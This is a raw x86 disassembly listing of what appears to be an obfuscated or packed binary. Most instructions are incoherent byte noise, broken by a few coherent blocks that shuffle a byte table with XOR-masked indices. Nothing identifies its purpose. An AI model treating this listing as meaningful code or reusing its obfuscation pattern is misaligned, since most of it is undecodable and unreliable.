  4049c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049c5:	bound  esi,QWORD PTR [edx+eiz*1-0x67]
  4049c9:	pop    es
  4049ca:	push   ebp
  4049cb:	in     al,0x6b
  4049cd:	mov    esi,DWORD PTR [esp+edi*2-0x4906b55f]
  4049d4:	jmp    0x4049e6
  4049d6:	xor    esi,eax
  4049d8:	mov    DWORD PTR [esi+0x7bed2483],ecx
  4049de:	xor    dh,dl
  4049e0:	clc    
  4049e1:	mov    esp,0x1182ff09
  4049e6:	mov    ebp,0x7cd6c67
  4049eb:	scas   eax,DWORD PTR es:[edi]
  4049ec:	xchg   ebp,eax
  4049ed:	add    eax,0x533b8ac7
  4049f2:	inc    edx
  4049f3:	add    eax,0xace4d4dc
  4049f8:	inc    eax
  4049f9:	outs   dx,DWORD PTR ds:[esi]
  4049fa:	dec    esi
  4049fb:	xor    ah,BYTE PTR [eax-0x72b0de02]
  404a01:	mov    WORD PTR ds:0xb92c7686,cs
  404a07:	aam    0x8e
  404a09:	jnp    0x40498d
  404a0b:	cmp    DWORD PTR [esi-0x58],ecx
  404a0e:	push   cs
  404a0f:	out    dx,al
  404a10:	cdq    
  404a11:	dec    ebx
  404a12:	or     eax,0x5c1dbf2a
  404a17:	xchg   ecx,eax
  404a18:	stos   BYTE PTR es:[edi],al
  404a19:	(bad)  
  404a1a:	lock shr DWORD PTR [edx],1
  404a1d:	lock jge 0x404a91
  404a20:	iret   
  404a21:	add    cl,ah
  404a23:	sbb    BYTE PTR [ebx],bl
  404a25:	adc    al,0xc9
  404a27:	test   eax,0x587760d9
  404a2c:	xchg   ecx,eax
  404a2d:	out    dx,al
  404a2e:	adc    ecx,DWORD PTR [edi+eax*4]
  404a31:	inc    esp
  404a32:	mul    DWORD PTR [eax+eiz*4-0x24]
  404a36:	retf   
  404a37:	outs   dx,BYTE PTR ds:[esi]
  404a38:	out    dx,eax
  404a39:	add    eax,DWORD PTR [edx-0x57]
  404a3c:	dec    ebx
  404a3d:	mov    ds:0x17b7e912,al
  404a42:	dec    ebx
  404a43:	ss xchg ebx,eax
  404a45:	mov    WORD PTR [esi-0x33],?
  404a48:	cli    
  404a49:	pop    ecx
  404a4a:	push   ecx
  404a4b:	xchg   DWORD PTR [edx-0x476c5e9a],edi
  404a51:	into   
  404a52:	mov    ah,BYTE PTR [esi]
  404a54:	mov    ds:0x9b9063e4,eax
  404a59:	pop    ecx
  404a5a:	mov    ds:0xc08ccf96,al
  404a5f:	jnp    0x404a90
  404a61:	pushf  
  404a62:	loope  0x404acc
  404a64:	cmc    
  404a65:	mov    dl,0x34
  404a67:	loopne 0x404ad1
  404a69:	sbb    BYTE PTR [ecx+edi*2],dh
  404a6c:	enter  0x201,0x9a
  404a70:	jo     0x404ad3
  404a72:	mov    bh,BYTE PTR [ebp-0x1756478f]
  404a78:	xor    al,0xfa
  404a7a:	xchg   edi,eax
  404a7b:	dec    esi
  404a7c:	sbb    al,0x6c
  404a7e:	cmp    edx,esi
  404a80:	add    al,0x99
  404a82:	inc    edx
  404a83:	pop    ds
  404a84:	and    DWORD PTR [edx-0x79],edi
  404a87:	inc    eax
  404a88:	inc    ebx
  404a89:	pushf  
  404a8a:	xchg   ch,dl
  404a8c:	push   esi
  404a8d:	xlat   BYTE PTR ds:[ebx]
  404a8e:	sbb    ch,BYTE PTR [ecx]
  404a90:	ficomp DWORD PTR [ebx-0x65127b90]
  404a96:	mov    edx,0xa90302d8
  404a9b:	jae    0x404a87
  404a9d:	dec    eax
  404a9e:	cwde   
  404a9f:	push   esp
  404aa0:	and    eax,DWORD PTR [edx]
  404aa2:	jl     0x404aca
  404aa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404aa5:	push   cs
  404aa6:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404aad:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0xc63c6a28
  404b32:	stc    
  404b33:	cmc    
  404b34:	cmc    
  404b35:	mov    ds:0x587e7e22,al
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404ae7
  404b3e:	jle    0x404b5b
  404b40:	hlt    
  404b41:	lods   eax,DWORD PTR ds:[esi]
  404b42:	push   esp
  404b43:	jo     0x404b67
  404b45:	mov    edx,0xeadf4065
  404b4a:	mov    cs,WORD PTR [esi]
  404b4c:	mov    al,ds:0xad07c8bc
  404b51:	inc    ebp
  404b52:	aas    
  404b53:	cwde   
  404b54:	mov    ecx,0xa168a63d
  404b59:	ret    0x281e
  404b5c:	sub    DWORD PTR [ecx],0x1e
  404b5f:	imul   eax,DWORD PTR ds:0x4c6dda69,0x2d
  404b66:	cdq    
  404b67:	jp     0x404b0a
  404b69:	out    0xae,eax
  404b6b:	iret   
  404b6c:	xor    eax,0x6c0d02ec
  404b71:	push   0x5a
  404b73:	cmp    edx,DWORD PTR [edx]
  404b75:	test   al,0x8a
  404b77:	push   0xea0f9eaa
  404b7c:	and    eax,DWORD PTR [ebp+0x44]
  404b7f:	mov    esp,0x3166444a
  404b84:	fwait
  404b85:	sar    BYTE PTR [esi-0x63],1
  404b88:	outs   dx,BYTE PTR ds:[esi]
  404b89:	sub    dl,BYTE PTR [esi]
  404b8b:	jnp    0x404b57
  404b8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b8f:	sbb    al,0x80
  404b91:	mov    dh,0xed
  404b93:	jle    0x404b78
  404b95:	lea    ecx,[ecx+0x78]
  404b98:	sti    
  404b99:	add    dl,al
  404b9b:	jns    0x404b1f
  404b9d:	and    BYTE PTR [esi-0x23827199],cl
  404ba3:	aad    0x6c
  404ba5:	pop    ss
  404ba6:	cmp    DWORD PTR [edi-0x11],esi
  404ba9:	icebp  
  404baa:	nop
  404bab:	adc    BYTE PTR [edi-0x567c8231],cl
  404bb1:	(bad)  
  404bb2:	cmp    al,0x5
  404bb4:	sbb    edx,edi
  404bb6:	mov    DWORD PTR [ecx+ebp*2-0x80],ecx
  404bba:	test   BYTE PTR [ecx-0x34],al
  404bbd:	(bad)  
  404bbe:	scas   al,BYTE PTR es:[edi]
  404bbf:	fs jne 0x404b6d
  404bc2:	adc    eax,0x5e6c7d59
  404bc7:	pop    edx
  404bc8:	pushf  
  404bc9:	and    eax,0xb1b63387
  404bce:	hlt    
  404bcf:	adc    BYTE PTR [ebx-0x53098bdf],dl
  404bd5:	push   ss
  404bd6:	inc    edi
  404bd7:	add    al,0x73
  404bd9:	inc    edx
  404bda:	jo     0x404b74
  404bdc:	std    
  404bdd:	aas    
  404bde:	jne    0x404bf0
  404be0:	int    0x78
  404be2:	fwait
  404be3:	xor    DWORD PTR [edx],esi
  404be5:	inc    edx
  404be6:	ins    DWORD PTR es:[edi],dx
  404be7:	xchg   DWORD PTR [ecx],eax
  404be9:	aam    0xb7
  404beb:	pop    ebp
  404bec:	cmp    DWORD PTR [ebx],0xffffffe9
  404bef:	xchg   ebp,eax
  404bf0:	jnp    0x404bb1
  404bf2:	jge    0x404c19
  404bf4:	rol    edx,0x22
  404bf7:	xchg   esp,eax
  404bf8:	div    BYTE PTR [edx+ebx*4-0x2022e336]
  404bff:	cmp    ebp,DWORD PTR [eax-0x409447bf]
  404c05:	out    dx,eax
  404c06:	inc    ebx
  404c07:	xchg   BYTE PTR [ebx],bl
  404c09:	ss arpl bp,si
  404c0c:	inc    ecx
  404c0d:	dec    ebp
  404c0e:	neg    DWORD PTR [esi]
  404c10:	out    0x70,al
  404c12:	loope  0x404bb4
  404c14:	call   0xb14bc248
  404c19:	ins    BYTE PTR es:[edi],dx
  404c1a:	xchg   ecx,eax
  404c1b:	das    
  404c1c:	xlat   BYTE PTR ds:[ebx]
  404c1d:	nop
  404c1e:	push   ecx
  404c1f:	stos   BYTE PTR es:[edi],al
  404c20:	push   ds
  404c21:	or     eax,0xc5df1e81
  404c26:	xchg   ecx,eax
  404c27:	push   ss
  404c28:	push   ebx
  404c29:	imul   ebx,edi,0x50
  404c2c:	xchg   DWORD PTR [ebp+0x45],esp
  404c2f:	mov    esi,DWORD PTR [esi-0x23]
  404c32:	adc    al,0xf4
  404c34:	add    al,0x6f
  404c36:	mov    al,ds:0x8eac16a6
  404c3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c3c:	cmp    edi,DWORD PTR [edi+0x56c8154f]
  404c42:	push   ecx
  404c43:	mov    DWORD PTR [esp+ebx*1-0x5d],ecx
  404c47:	out    dx,al
  404c48:	push   edi
  404c49:	in     al,0x0
  404c4b:	hlt    
  404c4c:	rol    DWORD PTR [edi-0x11],0x62
  404c50:	test   al,0xae
  404c52:	adc    al,0xee
  404c54:	or     DWORD PTR [edx],edx
  404c56:	inc    edx
  404c57:	mov    BYTE PTR ds:0x349655d2,ah
  404c5d:	pushf  
  404c5e:	iret   
  404c5f:	je     0x404c20
  404c61:	int3   
  404c62:	psubsw mm2,QWORD PTR [ebp+0x79024efc]
  404c69:	mov    eax,ds:0xc08c8f3a
  404c6e:	push   ss
  404c6f:	xchg   ecx,eax
  404c70:	mov    esp,0xe71ca89d
  404c75:	rol    DWORD PTR [ecx-0x2dcfe4ed],1
  404c7b:	sub    esp,DWORD PTR [ebx+0x7a]
  404c7e:	jecxz  0x404c1b
  404c80:	mov    dh,0xd4
  404c82:	mov    ds:0xd05fe98,al
  404c87:	retf   
  404c88:	neg    DWORD PTR [ecx]
  404c8a:	shl    DWORD PTR [esi],1
  404c8c:	and    BYTE PTR [ebx+esi*1+0x45],cl
  404c90:	or     edx,DWORD PTR [edi-0x7f]
  404c93:	scas   eax,DWORD PTR es:[edi]
  404c94:	(bad)  
  404c95:	scas   al,BYTE PTR es:[edi]
  404c96:	ror    al,0x20
  404c99:	loop   0x404c4b
  404c9b:	stos   DWORD PTR es:[edi],eax
  404c9c:	mov    edx,0xb632175b
  404ca1:	mov    BYTE PTR [edi],ah
  404ca3:	(bad)  
  404ca4:	cmp    DWORD PTR [ebx-0x3],eax
  404ca7:	aas    
  404ca8:	mov    ecx,DWORD PTR [ecx+0x71]
  404cab:	ja     0x404c62
  404cad:	(bad)  
  404cae:	fld    TBYTE PTR [edi-0x3b2aae14]
  404cb4:	mov    bh,0xf7
  404cb6:	cmp    al,0xc6
  404cb8:	push   cs
  404cb9:	pop    edi
  404cba:	call   0x8877:0x5be60b60
  404cc1:	cmp    eax,0x18ddd7d9
  404cc6:	mov    ebp,0xa26be033
  404ccb:	rol    DWORD PTR [ebx+0x73],cl
  404cce:	arpl   WORD PTR [edi+0x11],dx
  404cd1:	stos   DWORD PTR es:[edi],eax
  404cd2:	pop    esp
  404cd3:	inc    ebx
  404cd4:	mov    ebx,0xf0a1527a
  404cd9:	mov    ch,0xff
  404cdb:	mov    ecx,0x34d21168
  404ce0:	adc    bl,BYTE PTR [edx-0x70ace381]
  404ce6:	cmp    dl,0x8a
  404ce9:	mov    dl,0xa4
  404ceb:	retf   0x9c7d
  404cee:	cmp    ebx,DWORD PTR [edx+0x6f5f279a]
  404cf4:	pop    esi
  404cf5:	push   esi
  404cf6:	cmp    ch,ah
  404cf8:	cmp    al,0x1f
  404cfa:	mov    ds:0x66ec0457,eax
  404cff:	repz push ebx
  404d01:	xchg   edi,eax
  404d02:	adc    dh,BYTE PTR [edi-0x46c05840]
  404d08:	fwait
  404d09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d0a:	and    BYTE PTR [ecx],al
  404d0c:	fwait
  404d0d:	sbb    eax,ebx
  404d0f:	in     eax,dx
  404d10:	or     BYTE PTR [ecx-0x4f],ah
  404d13:	pop    ebp
  404d14:	adc    cl,BYTE PTR [edx-0x77]
  404d17:	add    eax,0x5922993c
  404d1c:	pop    es
  404d1d:	jbe    0x404d59
  404d1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d20:	and    dl,cl
  404d22:	cmp    DWORD PTR [esi-0x35],eax
  404d25:	daa    
  404d26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d27:	adc    al,0x3b
  404d29:	sbb    BYTE PTR [ebp+0x6b4b5c30],0xdf
  404d30:	mov    dh,BYTE PTR [esi+eax*4]
  404d33:	xchg   esp,eax
  404d34:	pop    esp
  404d35:	mov    DWORD PTR [edx+0x64],edi
  404d38:	cmp    eax,esi
  404d3a:	in     eax,dx
  404d3b:	jl     0x404d64
  404d3d:	retf   0xc25b
  404d40:	or     edx,DWORD PTR [ecx]
  404d42:	pop    ebp
  404d43:	mov    dh,0x92
  404d45:	jecxz  0x404db5
  404d47:	sub    BYTE PTR [edx+0x3],al
  404d4a:	(bad)  
  404d4b:	xchg   ebp,eax
  404d4c:	xlat   BYTE PTR ds:[ebx]
  404d4d:	leave  
  404d4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d4f:	ins    DWORD PTR es:[edi],dx
  404d50:	cli    
  404d51:	xor    ebx,0x10e824b0
  404d57:	and    ebx,ebp
  404d59:	inc    edi
  404d5a:	or     bh,ch
  404d5c:	sbb    al,0x21
  404d5e:	imul   cx,dx,0x3955
  404d63:	(bad)  
  404d64:	jge    0x404dc8
  404d66:	add    BYTE PTR [ebx+esi*2+0x6b292667],ah
  404d6d:	dec    esp
  404d6e:	ins    DWORD PTR es:[edi],dx
  404d6f:	ins    DWORD PTR es:[edi],dx
  404d70:	retf   0xb84d
  404d73:	dec    edi
  404d74:	mov    ah,0xc
  404d76:	rol    edi,cl
  404d78:	jnp    0x404d67
  404d7a:	cmp    edx,0x7572b62b
  404d80:	mov    bl,0x57
  404d82:	call   FWORD PTR [ebx+ebx*8-0x7d]
  404d86:	fucomip st,st(3)
  404d88:	inc    edx
  404d89:	sbb    ebp,DWORD PTR [edi+ebp*8]
  404d8c:	jne    0x404d2c
  404d8e:	or     DWORD PTR [eax],0x4a
  404d91:	jmp    0x39a7:0xdc5bbb62
  404d98:	sbb    ch,BYTE PTR [ebp+0x67220de4]
  404d9e:	push   0xfffffff1
  404da0:	loop   0x404db7
  404da2:	jno    0x404d29
  404da4:	scas   eax,DWORD PTR es:[edi]
  404da5:	fnstsw WORD PTR [esi-0x44eaf763]
  404dab:	enter  0xa4fb,0x45
  404daf:	loop   0x404dfb
  404db1:	xchg   BYTE PTR [esi+0x30253281],al
  404db7:	mov    WORD PTR [ebx+0x1621e964],es
  404dbd:	imul   edi,DWORD PTR [edx+0x16],0xae219867
  404dc4:	test   DWORD PTR [esi+0x3f9a6afd],ebx
  404dca:	xchg   ebp,eax
  404dcb:	popa   
  404dcc:	data16 jnp 0x404da4
  404dcf:	xor    BYTE PTR [esp+edx*2-0x3],0xe
  404dd4:	cmp    al,0xac
  404dd6:	push   es
  404dd7:	(bad)  
  404dd9:	sbb    ch,BYTE PTR [edi+0x6fc4a57e]
  404ddf:	les    ecx,FWORD PTR ds:0x3b19df82
  404de5:	jmp    0x404dbb
  404de7:	or     al,0x58
  404de9:	dec    eax
  404dea:	or     BYTE PTR [ecx],0xd2
  404ded:	cmp    BYTE PTR [esi+0x4ffe9964],al
  404df3:	cmp    eax,ebp
  404df5:	mov    ecx,0xb6f406e9
  404dfa:	enter  0x559d,0xce
  404dfe:	ror    DWORD PTR [edx-0x56df5b03],0xd4
  404e05:	cmp    eax,0xe9f13229
  404e0a:	and    esp,DWORD PTR [eax+0x24]
  404e0d:	jmp    0xe7b3c679
  404e12:	fwait
  404e13:	mov    ds:0x7a334e06,eax
  404e18:	dec    ebp
  404e19:	std    
  404e1a:	sbb    al,0x57
  404e1c:	test   BYTE PTR [eax-0x51],dl
  404e1f:	enter  0xa50b,0xa9
  404e23:	add    edi,ecx
  404e25:	imul   edx,edi
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404e20
  404e5e:	aam    0xdc
  404e60:	push   ds
  404e61:	mov    WORD PTR [ecx],fs
  404e63:	jle    0x404ee3
  404e65:	pop    eax
  404e66:	jl     0x404ee6
  404e68:	jle    0x404e1c
  404e6a:	ret    
  404e6b:	jb     0x404e6b
  404e6d:	aad    0x9b
  404e6f:	dec    ebp
  404e70:	xchg   ebx,eax
  404e71:	pop    edx
  404e72:	xchg   DWORD PTR [eax-0x25503f66],esi
  404e78:	(bad)  
  404e79:	test   al,0x99
  404e7b:	push   esi
  404e7c:	icebp  
  404e7d:	sbb    al,0xd8
  404e7f:	and    al,0x8a
  404e81:	ficomp DWORD PTR cs:[ecx]
  404e84:	jbe    0x404e85
  404e86:	cmp    DWORD PTR [ecx+0x13],eax
  404e89:	sti    
  404e8a:	int3   
  404e8b:	jmp    0x404e1b
  404e8d:	cmc    
  404e8e:	sub    al,0xd4
  404e90:	imul   ebx,DWORD PTR [ebx+esi*2-0x70],0x65
  404e95:	out    0x2a,eax
  404e97:	fs int 0xd3
  404e9a:	popf   
  404e9b:	test   eax,0x819080af
  404ea0:	loope  0x404ecf
  404ea2:	adc    al,0xff
  404ea4:	mov    bl,0xe7
  404ea6:	sbb    DWORD PTR [esi+0x7a],0x78
  404eaa:	push   esi
  404eab:	push   edx
  404eac:	push   es
  404ead:	in     eax,dx
  404eae:	push   0x22
  404eb0:	sub    eax,0xcb899b3
  404eb5:	js     0x404f2c
  404eb7:	cmp    BYTE PTR [edi+0x9d2769e],0x1d
  404ebe:	and    al,0xdc
  404ec0:	fld    QWORD PTR [eax]
  404ec2:	mov    ah,0x72
  404ec4:	lds    ebx,FWORD PTR ds:0xeb341bc8
  404eca:	push   0x8cefb082
  404ecf:	cmp    DWORD PTR [edi+0x9d376bc],0x77
  404ed6:	js     0x404f35
  404ed8:	icebp  
  404ed9:	fwait
  404eda:	stos   BYTE PTR es:[edi],al
  404edb:	aad    0x61
  404edd:	in     al,dx
  404ede:	sub    ebx,edx
  404ee0:	mov    ds,WORD PTR [ebx-0x69]
  404ee3:	(bad)  
  404ee4:	cmp    dh,BYTE PTR [ebx+0x71]
  404ee7:	aas    
  404ee8:	jge    0x404ee3
  404eea:	jg     0x404e84
  404eec:	and    DWORD PTR [ebp+ecx*1+0x68],ecx
  404ef0:	pop    edx
  404ef1:	inc    ebp
  404ef2:	test   DWORD PTR [edi+0x3ddfcab3],0x43761dc0
  404efc:	mov    edx,0xde94f77d
  404f01:	sti    
  404f02:	cmc    
  404f03:	int3   
  404f04:	jo     0x404f77
  404f06:	inc    esi
  404f07:	push   esi
  404f08:	xchg   BYTE PTR [eax+0x7cef29ea],bh
  404f0e:	dec    ebx
  404f0f:	call   0xfd464a0a
  404f14:	xchg   ecx,eax
  404f15:	mov    esp,0x1df7c7bf
  404f1a:	sub    DWORD PTR [eax-0x5f],edx
  404f1d:	xchg   edx,eax
  404f1e:	fsubr  DWORD PTR [edi+0x33675c1d]
  404f24:	arpl   WORD PTR [edi+0x4b],dx
  404f27:	outs   dx,BYTE PTR ds:[esi]
  404f28:	test   DWORD PTR [ecx+edi*4],edx
  404f2b:	enter  0x7154,0xe1
  404f2f:	(bad)  
  404f30:	loop   0x404eb8
  404f32:	mov    DWORD PTR fs:[ebx],esi
  404f35:	jns    0x404f7e
  404f37:	add    esp,DWORD PTR [esi+0x6f3c0b71]
  404f3d:	shl    BYTE PTR [eax-0x5],0x20
  404f41:	dec    ebx
  404f42:	ins    BYTE PTR es:[edi],dx
  404f43:	adc    BYTE PTR [eax],ah
  404f45:	mov    al,ds:0xd8caf9f7
  404f4a:	sbb    DWORD PTR [edx],ecx
  404f4c:	pop    ds
  404f4d:	mov    eax,ds:0x3673b790
  404f52:	aaa    
  404f53:	rcr    DWORD PTR [ecx-0x73],cl
  404f56:	push   ds
  404f57:	pop    edx
  404f58:	pop    ecx
  404f59:	rcr    BYTE PTR [ecx+ecx*2],1
  404f5c:	lahf   
  404f5d:	int3   
  404f5e:	in     eax,0x8b
  404f60:	inc    ecx
  404f61:	dec    edx
  404f62:	int3   
  404f63:	fisubr WORD PTR [esi+0x1a]
  404f66:	mov    al,cl
  404f68:	sbb    al,BYTE PTR [edx]
  404f6a:	pop    ds
  404f6b:	lods   al,BYTE PTR ds:[esi]
  404f6c:	or     eax,0xf0fbb4fb
  404f71:	lods   eax,DWORD PTR ds:[esi]
  404f72:	test   BYTE PTR [ebp+0x12f8fcc9],0x6c
  404f79:	in     eax,dx
  404f7a:	test   BYTE PTR ds:0x948bbe1d,ah
  404f80:	or     dh,BYTE PTR [ecx-0x1fa673e8]
  404f86:	popf   
  404f87:	fisttp QWORD PTR [edi+0xb669552]
  404f8d:	lods   al,BYTE PTR ds:[esi]
  404f8e:	mov    dh,0x64
  404f90:	retf   0x300c
  404f93:	and    eax,DWORD PTR [ebp+0x1e]
  404f96:	sar    cl,1
  404f98:	test   BYTE PTR [ebx-0x5],cl
  404f9b:	out    dx,al
  404f9c:	fidivr DWORD PTR [ecx-0x1f]
  404f9f:	lock ret 
  404fa1:	out    0x4a,al
  404fa3:	dec    esi
  404fa4:	cmc    
  404fa5:	pop    edx
  404fa6:	and    DWORD PTR [ecx],esp
  404fa8:	das    
  404fa9:	push   es
  404faa:	xor    al,0x96
  404fac:	inc    esp
  404fad:	push   0x35
  404faf:	addr16 js 0x404f39
  404fb2:	inc    edx
  404fb3:	das    
  404fb4:	mov    eax,ds:0xf5580580
  404fb9:	sbb    esp,DWORD PTR [ebx+ebp*2-0x9]
  404fbd:	in     eax,0xe2
  404fbf:	jmp    0x404fad
  404fc1:	mov    bh,0xd9
  404fc3:	xchg   ebx,eax
  404fc4:	shr    BYTE PTR [edx],cl
  404fc6:	rol    DWORD PTR [edx-0x46c903e1],0x1a
  404fcd:	enter  0x32a8,0xdd
  404fd1:	mov    eax,ds:0x6a2357e2
  404fd6:	xchg   ebx,eax
  404fd7:	stos   DWORD PTR es:[edi],eax
  404fd8:	clc    
  404fd9:	mov    ebx,0x27fd06ea
  404fdf:	cmp    eax,0x6b31beb5
  404fe4:	ret    
  404fe5:	inc    ebp
  404fe6:	jne    0x404fa5
  404fe8:	inc    edi
  404fe9:	(bad)  
  404fea:	lock add bl,al
  404fed:	xchg   eax,eax
  404fef:	loop   0x404f87
  404ff1:	pop    edx
  404ff2:	lods   al,BYTE PTR ds:[esi]
  404ff3:	lods   al,BYTE PTR ds:[esi]
  404ff4:	jb     0x404fc0
  404ff6:	xchg   ebp,eax
  404ff7:	or     eax,0xe5ee7348
  404ffc:	cmp    edi,ecx
  404ffe:	sbb    DWORD PTR [ebx],esp
  405000:	cwde   
  405001:	xor    eax,0x76e4a699
  405006:	and    ecx,ecx
  405008:	jnp    0x40500d
  40500a:	hlt    
  40500b:	gs xchg edx,eax
  40500d:	daa    
  40500e:	imul   edi,DWORD PTR [eax-0x2e],0xca33de7e
  405015:	and    eax,0x54f52008
  40501a:	inc    eax
  40501b:	dec    eax
  40501c:	test   BYTE PTR [edi-0x45],bh
  40501f:	das    
  405020:	jae    0x404fb7
  405022:	jg     0x40501e
  405024:	mov    bh,0x3a
  405026:	inc    edx
  405027:	push   ss
  405028:	mov    eax,0x7340b10a
  40502d:	fwait
  40502e:	jne    0x404fbf
  405030:	shr    DWORD PTR [ebx],1
  405032:	add    dl,BYTE PTR [esi]
  405034:	(bad)  
  405035:	shl    BYTE PTR [edx+0x21],0x4b
  405039:	aaa    
  40503a:	and    al,0x87
  40503c:	mov    esi,0xefcbd3d2
  405041:	xor    al,0x95
  405043:	outs   dx,DWORD PTR ds:[esi]
  405044:	or     eax,0x23c8ae7
  405049:	jge    0x404fd2
  40504b:	push   0x15
  40504d:	rcr    DWORD PTR [ebx],0xe8
  405050:	or     ch,BYTE PTR [edi]
  405052:	pop    esi
  405053:	xchg   DWORD PTR [edi+0x37],esp
  405056:	out    0x2b,eax
  405058:	fst    QWORD PTR [ebx-0x42f9e776]
  40505e:	outs   dx,DWORD PTR ds:[esi]
  40505f:	push   ecx
  405060:	jno    0x405036
  405062:	xor    dh,ch
  405064:	outs   dx,WORD PTR ds:[esi]
  405066:	and    ch,BYTE PTR [edx+0x4f8f96a5]
  40506c:	fdivr  QWORD PTR [ecx]
  40506e:	sbb    bh,BYTE PTR [edi+ebp*2+0x2bc45805]
  405075:	xlat   BYTE PTR ds:[ebx]
  405076:	xchg   ebp,eax
  405077:	int3   
  405078:	mov    ch,0xd7
  40507a:	xor    DWORD PTR [ebx+0x228bfe4e],ebp
  405080:	fbld   TBYTE PTR [ecx-0x7f]
  405083:	rol    edi,0x72
  405086:	sbb    al,0x3e
  405088:	lahf   
  405089:	imul   edx,DWORD PTR [edi],0x59
  40508c:	arpl   WORD PTR [edx],cx
  40508e:	mov    ah,0x7e
  405090:	jae    0x4050f4
  405092:	sub    dl,BYTE PTR [esi+0x12]
  405095:	mov    DWORD PTR [esi+0x145e6d6c],edi
  40509b:	pushf  
  40509c:	in     eax,0x5b
  40509e:	dec    ebx
  40509f:	mov    DWORD PTR ds:0x42644581,esp
  4050a5:	xchg   edx,eax
  4050a6:	pushf  
  4050a7:	fstp   DWORD PTR [esi-0x6954f8c9]
  4050ad:	push   edx
  4050ae:	jo     0x405069
  4050b0:	test   DWORD PTR [esi],esi
  4050b2:	jp     0x40511b
  4050b4:	xchg   BYTE PTR [ecx+eiz*2+0xbc03c4],ch
  4050bb:	test   eax,0x108e1ff
  4050c0:	retf   0xbb4c
  4050c3:	mov    esi,0x34d0aeec
  4050c8:	mov    ah,0xe4
  4050ca:	mov    bh,0x64
  4050cc:	mov    al,ds:0xec78fdc7
  4050d1:	loopne 0x4050f5
  4050d3:	shl    bl,0x78
  4050d6:	pusha  
  4050d7:	cmp    BYTE PTR [ebp+0x53],bl
  4050da:	sahf   
  4050db:	mov    cl,0x4f
  4050dd:	stos   DWORD PTR es:[edi],eax
  4050de:	xor    edi,DWORD PTR [esi+esi*4+0x495de199]
  4050e5:	out    dx,al
  4050e6:	outs   dx,BYTE PTR ds:[esi]
  4050e7:	(bad)  
  4050e8:	xchg   edi,eax
  4050e9:	inc    esp
  4050ea:	pop    ebp
  4050eb:	push   ebp
  4050ec:	fmulp  st(0),st
  4050ee:	mov    eax,ds:0x66ad429d
  4050f3:	in     eax,dx
  4050f4:	cli    
  4050f5:	push   ebp
  4050f6:	ins    DWORD PTR es:[edi],dx
  4050f7:	ficom  DWORD PTR [eax+0x48db38a2]
  4050fd:	dec    eax
  4050fe:	outs   dx,DWORD PTR ds:[esi]
  4050ff:	mov    ch,0x8b
  405101:	or     al,0x17
  405103:	xchg   DWORD PTR [ebp+0x38b4fc7d],ebp
  405109:	inc    ebp
  40510a:	mov    ah,0xa1
  40510c:	fild   DWORD PTR [edx]
  40510e:	clc    
  40510f:	test   eax,0xb1347f55
  405114:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405115:	icebp  
  405116:	jecxz  0x4050d9
  405118:	add    eax,0x412627d0
  40511d:	stos   DWORD PTR es:[edi],eax
  40511e:	retf   
  40511f:	push   ss
  405120:	xor    al,0x3c
  405122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405123:	jno    0x405154
  405125:	mov    bl,0x45
  405127:	call   0xc380154c
